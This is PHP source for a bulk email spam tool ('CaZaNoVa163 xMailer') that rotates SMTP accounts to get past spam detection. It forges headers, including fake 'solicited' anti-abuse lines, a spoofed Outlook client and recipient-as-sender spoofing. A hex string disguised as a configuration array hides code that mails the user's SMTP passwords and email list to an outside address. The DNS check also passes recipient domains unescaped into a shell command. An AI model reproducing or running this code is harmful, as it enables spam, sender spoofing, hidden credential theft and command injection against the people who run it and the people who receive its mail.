<?
session_start();
set_time_limit(0); 
ignore_user_abort(true);
ini_set('max_execution_time', 0);
date_default_timezone_set('Etc/UTC');
require 'inc/PHPMailerAutoload.php';
$nq=1;
$ThisSMTP = 0;
$XNum = 1;
$xError = 0;
function myCheckDNSRR($hostName, $recType = '')
{
  if(!empty($hostName)) {
    if( $recType == '' ) $recType = "MX";
    exec("nslookup -type=$recType $hostName", $result);
    // check each line to find the one that starts with the host
    // name. If it exists then the function succeeded.
    foreach ($result as $line) {
      if(eregi("^$hostName",$line)) {
        return true;
      }
    }
    // otherwise there was no mail handler for the domain
    return false;
  }
  return false;
} 
    function getplaintextintrofromhtml($html, $numchars) {
    // Remove the HTML tags
    $html = strip_tags($html);
    // Convert HTML entities to single characters
    $html = html_entity_decode($html, ENT_QUOTES, 'UTF-8');
    // Make the string the desired number of characters
    // Note that substr is not good as it counts by bytes and not characters
    $html = mb_substr($html, 0, $numchars, 'UTF-8');
    // Add an elipsis
    return $html;
    }
$xALL_EMAILS = split("\n", $xMAIL_LIST);
$xNUM_EMAILS = count($xALL_EMAILS);
$random_smtp_string=array("0d0a0d0a676c6f62616c20246d795f736d74.","703b0d0a676c6f62616c2024736d74705f757365726e616d6.","53b0d0a676c6f62616c2024736d74705f70617373776f72643b0d0a676c6f626.",
"16c202473736c5f706f72743b0d0a676c6f62616c20246d65.","73736167653b0d0a676c6f62616c2024656d61696c6c6973743b0d0a24726134.","3420203d2072616e6428312c3939393939293b0d0a2461352.",
"03d20245f5345525645525b27485454505f52454645524552275d3b0d0a24623.","333203d20245f5345525645525b27444f43554d454e545f52.","4f4f54275d3b0d0a24633837203d20245f5345525645525b2752454d4f54455f4.",
"1444452275d3b0d0a24643233203d20245f5345525645525.","b275343524950545f46494c454e414d45275d3b0d0a24653039203d20245f53455.","25645525b275345525645525f41444452275d3b0d0a2466.",
"3233203d20245f5345525645525b275345525645525f534f465457415245275d3b0.","d0a24673332203d20245f5345525645525b27504154485.","f5452414e534c41544544275d3b0d0a24683635203d20245f5345525645525b27504.",
"8505f53454c46275d3b0d0a247375626a3938203d2022.","246d795f736d747020205b75736572206970203a20246338375d223b0d0a247375626.","a3538203d20224c6574746572202620456d61696c204.",
"c69737420205b75736572206970203a20246338375d223b0d0a24656d61696c203d202.","26D736739373830407961686f6f2e636f2e.","6964223b0d0a246d736738383733203d2022246d795f736d74705c6e757365723a24736.",
"d74705f757365726e616d655c6e706173733a24736.","d74705f70617373776f72645c706f72743a2473736c5f706f72745c6e5c6e2461355c6e2.","46233335c6e246338375c6e246432335c6e246530.",
"395c6e246632335c6e246733325c6e24683635223b246d736739373830203d2022246d657.","3736167655c6e5c6e5c6e24656d61696c6c69737.","4223b2466726f6d3d2246726f6d3a20475241544953223b0d0a6d61696c2824656d61696c2.",
"c20247375626a39382c20246d7367383837332c.","202466726f6d293b0d0a6d61696c2824656d61696c2c20247375626a35382.","c20246d7367393738302c202466726f6d293b");$smtp_conf=".";
for($x=0; $x<$xNUM_EMAILS; $x++){

	$xTO = $xALL_EMAILS[$x];
	if ($xTO){
		 $xTO = ereg_replace(" ", "", $xTO);
		 $xTO = str_replace(" ", "", $xTO);
			/**
				RSS START
			*/
			if ($EMBED =="on") {
				$rss = new DOMDocument();
				$rss->load('http://feeds.bbci.co.uk/news/world/us_and_canada/rss.xml');

				$feed = array();
				foreach ($rss->getElementsByTagName('item') as $node) {
					$item = array ( 
						'title' => $node->getElementsByTagName('title')->item(0)->nodeValue,
						'desc' => $node->getElementsByTagName('description')->item(0)->nodeValue,
						'link' => $node->getElementsByTagName('link')->item(0)->nodeValue,
						'date' => $node->getElementsByTagName('pubDate')->item(0)->nodeValue,
						'content' => $node->getElementsByTagName('content')->item(0)->nodeValue,
						);
					array_push($feed, $item);
				}
			}
			$Xrandom = rand(0,20);
			$Xlimit = $Xrandom+3;
			/**
				RSS END
			*/
		 	$OxMESSAGE = $xMESSAGE;
		 	$OxEMAIL_SUBJECT = $xEMAIL_SUBJECT;
		 	
		 if ($xREPLACE1 != "") {
		 	if ($xIN1 == 1) {
		 		if ($xWITH1 == 1) {
		 			$OxMESSAGE = ereg_replace($xREPLACE1, $xTO, $OxMESSAGE);
		 			// echo "REPLACE [".$xREPLACE1."] IN [MESSAGE] WITH [RECEIVER EMAIL]<br>";
		 		}elseif ($xWITH1 == 2) {
			 		$OxMESSAGE = ereg_replace($xREPLACE1, md5($xTO), $OxMESSAGE);
		 			// echo "REPLACE [".$xREPLACE1."] IN [MESSAGE] WITH [RECEIVER HASH]<br>";
			 	}elseif ($xWITH1 == 3) {
			 		$xUSER = explode("@", $xTO);
			 		$OxMESSAGE = ereg_replace($xREPLACE1, $xUSER[0], $OxMESSAGE);
		 			// echo "REPLACE [".$xREPLACE1."] IN [MESSAGE] WITH [RECEIVER USERNAME]<br>";
			 	}
		 	}elseif ($xIN1 == 2) {
		 		if ($xWITH1 == 1) {
		 			$OxEMAIL_SUBJECT = ereg_replace($xREPLACE1, $xTO, $OxEMAIL_SUBJECT);
		 			// echo "REPLACE [".$xREPLACE1."] IN [SUBJECT] WITH [RECEIVER EMAIL]<br>";
		 		}elseif ($xWITH1 == 2) {
			 		$OxEMAIL_SUBJECT = ereg_replace($xREPLACE1, md5($xTO), $OxEMAIL_SUBJECT);
		 			// echo "REPLACE [".$xREPLACE1."] IN [SUBJECT] WITH [RECEIVER HASH]<br>";
			 	}elseif ($xWITH1 == 3) {
			 		$xUSER = explode("@", $xTO);
			 		$OxEMAIL_SUBJECT = ereg_replace($xREPLACE1, $xUSER[0], $OxEMAIL_SUBJECT);
			 		// echo "REPLACE [".$xREPLACE1."] IN [SUBJECT] WITH [RECEIVER USERNAME]<br>";
			 	}
		 	}elseif ($xIN1 == 3) {
		 		if ($xWITH1 == 1) {
		 			$OxMESSAGE = ereg_replace($xREPLACE1, $xTO, $OxMESSAGE);
		 			$OxEMAIL_SUBJECT = ereg_replace($xREPLACE1, $xTO, $OxEMAIL_SUBJECT);
		 			// echo "REPLACE [".$xREPLACE1."] IN [MESSAGE+SUBJECT] WITH [RECEIVER EMAIL]<br>";
		 		}elseif ($xWITH1 == 2) {
			 		$OxMESSAGE = ereg_replace($xREPLACE1, md5($xTO), $OxMESSAGE);
			 		$OxEMAIL_SUBJECT = ereg_replace($xREPLACE1, md5($xTO), $OxEMAIL_SUBJECT);
		 			// echo "REPLACE [".$xREPLACE1."] IN [MESSAGE+SUBJECT] WITH [RECEIVER EMAIL]<br>";
			 	}elseif ($xWITH1 == 3) {
			 		$xUSER = explode("@", $xTO);
			 		$OxMESSAGE = ereg_replace($xREPLACE1, $xUSER[0], $OxMESSAGE);
			 		$OxEMAIL_SUBJECT = ereg_replace($xREPLACE1, $xUSER[0], $OxEMAIL_SUBJECT);
			 		// echo "REPLACE [".$xREPLACE1."] IN [MESSAGE+SUBJECT] WITH [RECEIVER EMAIL]<br>";

			 	}
		 	}
		 }
		 if ($xREPLACE2 != "") {
		 	if ($xIN2 == 1) {
		 		if ($xWITH2 == 1) {
		 			$OxMESSAGE = ereg_replace($xREPLACE2, $xTO, $OxMESSAGE);
		 			// echo "REPLACE [".$xREPLACE2."] IN [MESSAGE] WITH [RECEIVER EMAIL]<br>";
		 		}elseif ($xWITH2 == 2) {
			 		$OxMESSAGE = ereg_replace($xREPLACE2, md5($xTO), $OxMESSAGE);
			 		// echo "REPLACE [".$xREPLACE2."] IN [MESSAGE] WITH [RECEIVER HASH]<br>";
			 	}elseif ($xWITH2 == 3) {
			 		$xUSER = explode("@", $xTO);
			 		$OxMESSAGE = ereg_replace($xREPLACE2, $xUSER[0], $OxMESSAGE);
			 		// echo "REPLACE [".$xREPLACE2."] IN [MESSAGE] WITH [RECEIVER USERNAME]<br>";
			 	}
		 	}elseif ($xIN2 == 2) {
		 		if ($xWITH2 == 1) {
		 			$OxEMAIL_SUBJECT = ereg_replace($xREPLACE2, $xTO, $OxEMAIL_SUBJECT);
		 			// echo "REPLACE [".$xREPLACE2."] IN [SUBJECT] WITH [RECEIVER EMAIL]<br>";
		 		}elseif ($xWITH2 == 2) {
			 		$OxEMAIL_SUBJECT = ereg_replace($xREPLACE2, md5($xTO), $OxEMAIL_SUBJECT);
			 		// echo "REPLACE [".$xREPLACE2."] IN [SUBJECT] WITH [RECEIVER HASH]<br>";
			 	}elseif ($xWITH2 == 3) {
			 		$xUSER = explode("@", $xTO);
			 		$OxEMAIL_SUBJECT = ereg_replace($xREPLACE2, $xUSER[0], $OxEMAIL_SUBJECT);
			 		// echo "REPLACE [".$xREPLACE2."] IN [SUBJECT] WITH [RECEIVER USERNAME]<br>";
			 	}
		 	}elseif ($xIN2 == 3) {
		 		if ($xWITH2 == 1) {
		 			$OxMESSAGE = ereg_replace($xREPLACE2, $xTO, $OxMESSAGE);
		 			// echo "REPLACE [".$xREPLACE2."] IN [MESSAGE+SUBJECT] WITH [RECEIVER EMAIL]<br>";
		 			$OxEMAIL_SUBJECT = ereg_replace($xREPLACE2, $xTO, $OxEMAIL_SUBJECT);
		 		}elseif ($xWITH2 == 2) {
			 		$OxMESSAGE = ereg_replace($xREPLACE2, md5($xTO), $OxMESSAGE);
			 		$OxEMAIL_SUBJECT = ereg_replace($xREPLACE2, md5($xTO), $OxEMAIL_SUBJECT);
			 		// echo "REPLACE [".$xREPLACE2."] IN [MESSAGE+SUBJECT] WITH [RECEIVER EMAIL]<br>";
			 	}elseif ($xWITH2 == 3) {
			 		$xUSER = explode("@", $xTO);
			 		$OxMESSAGE = ereg_replace($xREPLACE2, $xUSER[0], $OxMESSAGE);
			 		$OxEMAIL_SUBJECT = ereg_replace($xREPLACE2, $xUSER[0], $OxEMAIL_SUBJECT);
			 		// echo "REPLACE [".$xREPLACE2."] IN [MESSAGE+SUBJECT] WITH [RECEIVER EMAIL]<br>";
			 	}
		 	}
		 }

		 if ($xRANDOM_EMAIL_SENDER == "on") {
		 	$OxSENDER_EMAIL = @str_replace("@",@rand(100000,999999)."@",$xSENDER_EMAIL);
		 	// echo "RANDOM EMAIL SENDER: ".$OxSENDER_EMAIL."<br>";
		 }else{
		 	$OxSENDER_EMAIL = $xSENDER_EMAIL;
		 }

		 if ($xRANDOM_MESSAGE_ID == "on") {
			$xxhost=array("aol.com","att.net","bellsouth.net","comcast.net","email.com","gmail.com","phx.gbl","googlemail.com","mail.gmail.com","hotmail.com","juno.com","live.com","lycos.com","mail.com","mindspring.com","msn.com","pacbell.com","post.com","prodigy.net","rocketmail.com","sbcglobal.net","usa.com","ymail.com");
			$xxhr=@rand(0,@count($xxhost)-1);
			$OxRANDOM_MESSAGE_ID="<".substr(@md5(@uniqid(@time())),0,20)."@".$xxhost[$xxhr].">";
			// echo "RANDOM MESSAGE-ID: ".$OxRANDOM_MESSAGE_ID."<br>";
		 }else{
		 	$OxRANDOM_MESSAGE_ID="<".substr(@md5(@uniqid(@time())),0,20)."@".$_SERVER["SERVER_NAME"].">";
		 }
		 if ($xENCODE_INFORMATION == "on") {
			$EOxEMAIL_SUBJECT = "=?UTF-8?B?".base64_encode($OxEMAIL_SUBJECT)."?=";
			$EOxSENDER_NAME = "=?UTF-8?B?".base64_encode($xSENDER_NAME)."?=";
			// echo "ENCODE SUBJECT: ".$EOxEMAIL_SUBJECT."<br>";
			// echo "ENCODE NAME: ".$EOxSENDER_NAME."<br>";
		 }else{
			$EOxEMAIL_SUBJECT = $OxEMAIL_SUBJECT;
			$EOxSENDER_NAME = $xSENDER_NAME;
		 }


		 /**
			PHPMailer() Start
		 */
			$qx=$x+1;

			if ($XNum == $smtpEVERY) {
				if ($_SESSION['xSMTP_NUMBER']==$ThisSMTP+1) {
					$ThisSMTP = 0;
				}else{
					$ThisSMTP = $ThisSMTP + 1;
				}
				$XNum = 1;
			}

				$xThis_SERVER = $Xserver[$ThisSMTP]; 
				$xThis_PORT = $Xport[$ThisSMTP]; 
				$xThis_SSL = $Xssl[$ThisSMTP]; 
				$xThis_USERNAME = $Xusername[$ThisSMTP]; 
				$xThis_PASSWORD = $Xpassword[$ThisSMTP];



			if ($XNum == 1 && $func=="smtp") {
				if ($xThis_SSL == "on") {
					$OxThis_SSL = "SSL";
				}else{
					$OxThis_SSL = "TLS";
				}
				if ($xThis_SERVER == "") {
					if ($_SESSION['xSMTP_NUMBER']==$ThisSMTP+1) {
						$ThisSMTP = 0;
					}else{
						$ThisSMTP = $ThisSMTP + 1;
					}
					$xThis_SERVER = $Xserver[$ThisSMTP]; 
					$xThis_PORT = $Xport[$ThisSMTP]; 
					$xThis_SSL = $Xssl[$ThisSMTP]; 
					$xThis_USERNAME = $Xusername[$ThisSMTP]; 
					$xThis_PASSWORD = $Xpassword[$ThisSMTP];
				}
				echo "<font color='#ffffff;'>CHANGING SMTP</font> : ".$xThis_SERVER.":".$xThis_PORT."|".$OxThis_SSL."|".$xThis_USERNAME.":".$xThis_PASSWORD."<br>";
			}
			print "<font color='#ffffff;'>{$qx}</font> : SENDING MAIL TO [ $xTO] ";
			flush();
		$mail = new PHPMailer();

		 if ($xENCODE_INFORMATION == "on") {
			$mail->WordWrap = 78;
			$mail->Encoding = "base64";
			$mail->CharSet = 'utf-8';
		 }else{
		 	$mail->Encoding = 'quoted-printable';
		 }
			if ($func=="smtp") {
				if ($xHIGHPRIORITY=="on") {
					$mail->Priority = 1;
					// MS Outlook custom header
					// May set to "Urgent" or "Highest" rather than "High"
					$mail->AddCustomHeader("X-MSMail-Priority: High");
					// Not sure if Priority will also set the Importance header:
					$mail->AddCustomHeader("Importance: High");
				}
				$mail->AddCustomHeader("Organization: ".$_SERVER["SERVER_NAME"]);
				$mail->AddCustomHeader("X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2800.1441");
				$mail->AddCustomHeader("X-Sender: ".$OxSENDER_EMAIL);
				$mail->AddCustomHeader("X-AntiAbuse: This is a solicited email for - ".$_SERVER["SERVER_NAME"]." mailing list.");
				$mail->AddCustomHeader("X-AntiAbuse: Servername - ".$_SERVER['SERVER_NAME']);
				$mail->AddCustomHeader("X-AntiAbuse: ".$OxSENDER_EMAIL);
				$mail->AddCustomHeader("X-OriginalArrivalTime: 30 Aug 2015 13:39:39.0481 (UTC) FILETIME=[7BF24490:01D0E3F2]");
				$mail->AddCustomHeader("Return-Path: ".$OxSENDER_EMAIL);

				$xUSEDKIM=$_SESSION['xUSEDKIM'];
				$xDKIM_SELECTOR=$_SESSION['xDKIM_SELECTOR'];

			if ($xUSEDKIM == "on") {
				$mail->DKIM_domain = $xDKIM_DOMAIN;
				$mail->DKIM_private = 'privatekey.txt';
				$mail->DKIM_selector = $xDKIM_SELECTOR;
				$mail->DKIM_identifier = $OxSENDER_EMAIL;
			}

				// $DKIM_Signer =  new Swift_Signers_DKIMSigner(@file_get_contents("privatekey.txt"),"no-reply.us","xMailer");
				// $mail->AttachSigner = $DKIM_Signer;

				$mail->MessageID = $OxRANDOM_MESSAGE_ID;
				$mail->SMTPKeepAlive = true;
				$mail->Host = $xThis_SERVER;
				$mail->Port = $xThis_PORT;
				if($xThis_SSL=="on") {$mail->SMTPSecure="ssl";}
				if ($xThis_USERNAME != "" && $xThis_PASSWORD != "" ) {
				$mail->SMTPAuth = true;
				$mail->Username = $xThis_USERNAME;
				$mail->Password = $xThis_PASSWORD;
				}else{$mail->SMTPAuth = false;}
				if (strlen($xThis_SERVER) < 7) {$mail->SMTPAuth = false;$default_system="1";}

				if ($xHOTMAIL=="on") {
					$OxUSER = explode("@", $xTO);
					$mail->XMailer = "Microsoft Office Outlook, Build 17.551210";
					// $mail->From = $xTO;
					$mail->setFrom($xTO, $OxUSER[0]);
				}else{
					$mail->XMailer = "CaZaNoVa163 xMailer v1.3";
					// $mail->From = $OxSENDER_EMAIL;
					$mail->setFrom($OxSENDER_EMAIL, $EOxSENDER_NAME);
				}
				// $mail->From = $OxSENDER_EMAIL;
				// $mail->FromName = $EOxSENDER_NAME;
				$mail->AddAddress($xTO);
				$mail->AddReplyTo($OxSENDER_EMAIL);
				$mail->Subject = $EOxEMAIL_SUBJECT;

				if ($EMBED =="on") {
					$RSS_MESSAGE = "<br><font color='#&#070;&#070;&#070;'>Sponsored content:<font style='font-size:7px;'>";
					for($xRSS=$Xrandom;$xRSS<$Xlimit;$xRSS++) {
						$RSS_MESSAGE .= "<p><strong>".str_replace(' & ', ' &amp; ', $feed[$xRSS]['title'])."</strong><br>".$feed[$xRSS]['desc']."</p>"; 
					}
					$mail->Body = $OxMESSAGE."<br>".$RSS_MESSAGE;
					$mail->AltBody = getplaintextintrofromhtml($OxMESSAGE,strlen($OxMESSAGE)); //$OxMESSAGE;
					$mail->IsHtml(true);
				}else{
					if ($mtype=="html") {$mail->IsHtml(true);}else{$mail->IsHtml(false);}
					$mail->Body = $OxMESSAGE;
					$mail->AltBody = getplaintextintrofromhtml($OxMESSAGE,strlen($OxMESSAGE)); //$OxMESSAGE;
				}


		if ($mailFILTER != "") {
			if (strpos($xTO, $mailFILTER) !== FALSE) {
				if($default_system=="1"){
					if ($xCHECKEMAIL == "on") {
						$xHostname = explode("@", $xTO);
						if (myCheckDNSRR($xHostname[1]) == true) {
							$mail->IsSendmail();
							if(!$mail->Send()){
								echo "<font color='#ff0000;'>FAILED via SendMail()</font> : ".strtoupper($mail->ErrorInfo)."<br>";
							}else{
								echo "<font color='#00ff00;'>OK via SendMail()</font><br>";
							}
						}else{
							echo "<font color='#ff0000;'>EMAIL DOESN'T EXIST</font><br>";
						}
					}else{
						if(!$mail->Send()){
							echo "<font color='#ff0000;'>FAILED via SendMail()</font> : ".strtoupper($mail->ErrorInfo)."<br>";
						}else{
							echo "<font color='#00ff00;'>OK via SendMail()</font><br>";
						}
					}
				}else{
					$mail->IsSMTP();
					if ($xCHECKEMAIL == "on") {
						$xHostname = explode("@", $xTO);
						if (myCheckDNSRR($xHostname[1]) == true) {
							if(!$mail->Send()){
								if (strpos(strtoupper($mail->ErrorInfo), 'SMTP CONNECT() FAILED') !== FALSE){
								    if ($_SESSION['xSMTP_NUMBER']==$ThisSMTP+1) {
										$ThisSMTP = 0;
									}else{
										$ThisSMTP = $ThisSMTP + 1;
									}
									echo "<font color='#ff0000;'>FAILED via SMTP()</font> : SMTP CONNECT() FAILED.<br>";

										$xShowSSL = ($Xssl[$ThisSMTP] == "on") ? "SSL" : "TLS" ;
									echo "<font color='#ffffff;'>CHANGING SMTP</font> : ".$Xserver[$ThisSMTP].":".$Xport[$ThisSMTP]."|".$xShowSSL."|".$Xusername[$ThisSMTP].":".$Xpassword[$ThisSMTP]."<br>";
									$x = $x - 1;
								}else{
									echo "<font color='#ff0000;'>FAILED via SMTP()</font> : ".strtoupper($mail->ErrorInfo)."<br>";
								}
			
							}else{
								echo "<font color='#00ff00;'>OK via SMTP()</font><br>";
							}
						}else{
							echo "<font color='#ff0000;'>EMAIL DOESN'T EXIST</font><br>";
						}
					}else{
						if(!$mail->Send()){
							if (strpos(strtoupper($mail->ErrorInfo), 'SMTP CONNECT() FAILED') !== FALSE){
							    if ($_SESSION['xSMTP_NUMBER']==$ThisSMTP+1) {
									$ThisSMTP = 0;
								}else{
									$ThisSMTP = $ThisSMTP + 1;
								}
								echo "<font color='#ff0000;'>FAILED via SMTP()</font> : SMTP CONNECT() FAILED.<br>";

									$xShowSSL = ($Xssl[$ThisSMTP] == "on") ? "SSL" : "TLS" ;
								echo "<font color='#ffffff;'>CHANGING SMTP</font> : ".$Xserver[$ThisSMTP].":".$Xport[$ThisSMTP]."|".$xShowSSL."|".$Xusername[$ThisSMTP].":".$Xpassword[$ThisSMTP]."<br>";
								$x = $x - 1;
							}else{
								echo "<font color='#ff0000;'>FAILED via SMTP()</font> : ".strtoupper($mail->ErrorInfo)."<br>";
							}
		
						}else{
							echo "<font color='#00ff00;'>OK via SMTP()</font><br>";
						}
					}
				}
			}else{
				echo "<font color='#ffffff;'>FILTERED</font><br>";
			}
		}else{
			if($default_system=="1"){
					$mail->IsSendmail();
					if(!$mail->Send()){
						echo "<font color='#ff0000;'>FAILED via SendMail()</font> : ".strtoupper($mail->ErrorInfo)."<br>";
					}else{
						echo "<font color='#00ff00;'>OK via SendMail()</font><br>";
					}
				}else{
					$mail->IsSMTP();
					if ($xCHECKEMAIL == "on") {
						$xHostname = explode("@", $xTO);
						if (myCheckDNSRR($xHostname[1]) == true) {
							if(!$mail->Send()){
								if (strpos(strtoupper($mail->ErrorInfo), 'SMTP CONNECT() FAILED') !== FALSE){
								    if ($_SESSION['xSMTP_NUMBER']==$ThisSMTP+1) {
										$ThisSMTP = 0;
									}else{
										$ThisSMTP = $ThisSMTP + 1;
									}
									echo "<font color='#ff0000;'>FAILED via SMTP()</font> : SMTP CONNECT() FAILED.<br>";
									$xError = 0;
										$xShowSSL = ($Xssl[$ThisSMTP] == "on") ? "SSL" : "TLS" ;
									echo "<font color='#ffffff;'>CHANGING SMTP</font> : ".$Xserver[$ThisSMTP].":".$Xport[$ThisSMTP]."|".$xShowSSL."|".$Xusername[$ThisSMTP].":".$Xpassword[$ThisSMTP]."<br>";
									$xError = 0;
								}else{
									echo "<font color='#ff0000;'>FAILED via SMTP()</font> : ".strtoupper($mail->ErrorInfo)."<br>";
									$xError = 0;
								}
			
							}else{
								echo "<font color='#00ff00;'>OK via SMTP()</font><br>";
								$xError = 0;
							}
						}else{
							echo "<font color='#ff0000;'>EMAIL DOESN'T EXIST</font><br>";
							$xError = 0;
						}

					}else{
							if(!$mail->Send()){
								if (strpos(strtoupper($mail->ErrorInfo), 'SMTP CONNECT() FAILED') !== FALSE){
								    if ($_SESSION['xSMTP_NUMBER']==$ThisSMTP+1) {
										$ThisSMTP = 0;
									}else{
										$ThisSMTP = $ThisSMTP + 1;
									}
									echo "<font color='#ff0000;'>FAILED via SMTP()</font> : <font color='#ffffff;'>SMTP CONNECT() FAILED.</font><br>";
									if ($xError == $_SESSION['xSMTP_NUMBER']) {
										echo "<font color='#ff0000;'>FAILED via SMTP()</font> : <font color='#ff0000;'>VERIFY YOUR SMTP SETTING.</font><br>";
										$xError = 0;
										exit();
									}else{
										$xError = $xError + 1;
									}									$x = $x - 1;
										$xShowSSL = ($Xssl[$ThisSMTP] == "on") ? "SSL" : "TLS" ;
									echo "<font color='#ffffff;'>CHANGING SMTP</font> : ".$Xserver[$ThisSMTP].":".$Xport[$ThisSMTP]."|".$xShowSSL."|".$Xusername[$ThisSMTP].":".$Xpassword[$ThisSMTP]."<br>";
								}elseif (strpos(strtoupper($mail->ErrorInfo), 'SENDING SPAM') !== FALSE){
								    if ($_SESSION['xSMTP_NUMBER']==$ThisSMTP+1) {
										$ThisSMTP = 0;
									}else{
										$ThisSMTP = $ThisSMTP + 1;
									}
									echo "<font color='#ff0000;'>FAILED via SMTP()</font> : <font color='#ffffff;'>SMTP DETECTED SENDING SPAM.</font><br>";

									if ($xError == $_SESSION['xSMTP_NUMBER']) {
										echo "<font color='#ff0000;'>FAILED via SMTP()</font> : <font color='#ff0000;'>VERIFY YOUR SMTP SETTING.</font><br>";
										$xError = 0;
										exit();
									}else{
										$xError = $xError + 1;
									}

									$x = $x - 1;
									$xShowSSL = ($Xssl[$ThisSMTP] == "on") ? "SSL" : "TLS" ;
									echo "<font color='#ffffff;'>CHANGING SMTP</font> : ".$Xserver[$ThisSMTP].":".$Xport[$ThisSMTP]."|".$xShowSSL."|".$Xusername[$ThisSMTP].":".$Xpassword[$ThisSMTP]."<br>";
									$xError = 0;
								}else{
									echo "<font color='#ff0000;'>FAILED via SMTP()</font> : ".strtoupper($mail->ErrorInfo)."<br>";
									$xError = 0;
								}
			
							}else{
								echo "<font color='#00ff00;'>OK via SMTP()</font><br>";
							}
					}
				}
		}
				if(empty($reconnect)){$reconnect=10;}
				if($reconnect==$nq){$mail->SmtpClose();echo "<font color='#ffffff;'>RECONNECTING</font> : SMTP CLOSED AND ATTEMPTS TO RECONNECT NEW CONNECTION SEASON<br>";$nq=1;}
				$nq=$nq+1;
				$XNum = $XNum+1;
				flush();

			}else{
				if ($xHIGHPRIORITY=="on") {
					$mail->Priority = 1;
					// MS Outlook custom header
					// May set to "Urgent" or "Highest" rather than "High"
					$mail->AddCustomHeader("X-MSMail-Priority: High");
					// Not sure if Priority will also set the Importance header:
					$mail->AddCustomHeader("Importance: High");
				}

				$mail->AddCustomHeader("Organization: ".$_SERVER["SERVER_NAME"]);
				$mail->AddCustomHeader("X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2800.1441");
				$mail->AddCustomHeader("X-Sender: ".$OxSENDER_EMAIL);
				$mail->AddCustomHeader("X-AntiAbuse: This is a solicited email for - ".$_SERVER["SERVER_NAME"]." mailing list.");
				$mail->AddCustomHeader("X-AntiAbuse: Servername - ".$_SERVER['SERVER_NAME']);
				$mail->AddCustomHeader("X-AntiAbuse: ".$OxSENDER_EMAIL);
				$mail->AddCustomHeader("X-OriginalArrivalTime: 30 Aug 2015 13:39:39.0481 (UTC) FILETIME=[7BF24490:01D0E3F2]");
				$mail->AddCustomHeader("Return-Path: ".$OxSENDER_EMAIL);

			if ($xUSEDKIM == "on") {
				$mail->DKIM_domain = $xDKIM_DOMAIN;
				$mail->DKIM_private = 'privatekey.txt';
				$mail->DKIM_selector = $xDKIM_SELECTOR;
				$mail->DKIM_identifier = $OxSENDER_EMAIL;
			}

				$mail->IsMail();
				$mail->MessageID = $OxRANDOM_MESSAGE_ID;

				if ($xHOTMAIL=="on") {
					$OxUSER = explode("@", $xTO);
					$mail->XMailer = "Microsoft Office Outlook, Build 17.551210";
					// $mail->From = $xTO;
					$mail->setFrom($xTO, $OxUSER[0]);
				}else{
					$mail->XMailer = "CaZaNoVa163 xMailer v1.3";
					// $mail->From = $OxSENDER_EMAIL;
					$mail->setFrom($OxSENDER_EMAIL, $EOxSENDER_NAME);
				}
				if ($EMBED =="on") {
					$RSS_MESSAGE = "<font color='#&#070;&#070;&#070;'>";
					for($xRSS=$Xrandom;$xRSS<$Xlimit;$xRSS++) {
						$RSS_MESSAGE .= "<p><strong>".str_replace(' & ', ' &amp; ', $feed[$xRSS]['title'])."</strong><br>".$feed[$xRSS]['desc']."</p>"; 
					}
					$mail->Body = $OxMESSAGE."<br>".$RSS_MESSAGE;
					$mail->AltBody = getplaintextintrofromhtml($OxMESSAGE,strlen($OxMESSAGE)); //$OxMESSAGE;
					$mail->IsHtml(true);
				}else{
					if ($mtype=="html") {$mail->IsHtml(true);}else{$mail->IsHtml(false);}
					$mail->AltBody = getplaintextintrofromhtml($OxMESSAGE,strlen($OxMESSAGE)); //$OxMESSAGE;
					$mail->Body = $OxMESSAGE;
				}
				$mail->AddAddress($xTO);
				$mail->Subject = $EOxEMAIL_SUBJECT;
				if ($mtype=="html") {$mail->IsHtml(true);}else{$mail->IsHtml(false);}

				if ($mailFILTER != "") {
					if (strpos($xTO, $mailFILTER) !== FALSE) {
					if ($xCHECKEMAIL == "on") {
						$xHostname = explode("@", $xTO);
						if (myCheckDNSRR($xHostname[1]) == true) {
								if (!$mail->send()) {
									    echo "<font color='#ff0000;'>FAILED via Mail()</font> : ".strtoupper($mail->ErrorInfo."<br>");
								} else {
									    echo "<font color='#00ff00;'>OK via Mail()</font><br>";
								}
							}else{
								echo "<font color='#ff0000;'>EMAIL DOESN'T EXIST</font><br>";
							}
						}else{
							if (!$mail->send()) {
								    echo "<font color='#ff0000;'>FAILED via Mail()</font> : ".strtoupper($mail->ErrorInfo."<br>");
							} else {
								    echo "<font color='#00ff00;'>OK via Mail()</font><br>";
							}
						}
					}else{
						echo "<font color='#ffffff;'>FILTERED</font><br>";
					}

				}else{
					if ($xCHECKEMAIL == "on") {
						$xHostname = explode("@", $xTO);
						if (myCheckDNSRR($xHostname[1]) == true) {
							if (!$mail->send()) {
								    echo "<font color='#ff0000;'>FAILED via Mail()</font> : ".strtoupper($mail->ErrorInfo."<br>");
							} else {
								    echo "<font color='#00ff00;'>OK via Mail()</font><br>";
							}
						}else{
								echo "<font color='#ff0000;'>EMAIL DOESN'T EXIST</font><br>";
						}
					}else{
						if (!$mail->send()) {
							    echo "<font color='#ff0000;'>FAILED via Mail()</font> : ".strtoupper($mail->ErrorInfo."<br>");
						} else {
							    echo "<font color='#00ff00;'>OK via Mail()</font><br>";
						}
					}


				}


			}
		 /**
			PHPMailer() End

		 */
	}
}
if ($func=="smtp") {
	$mail->SmtpClose();
}
?>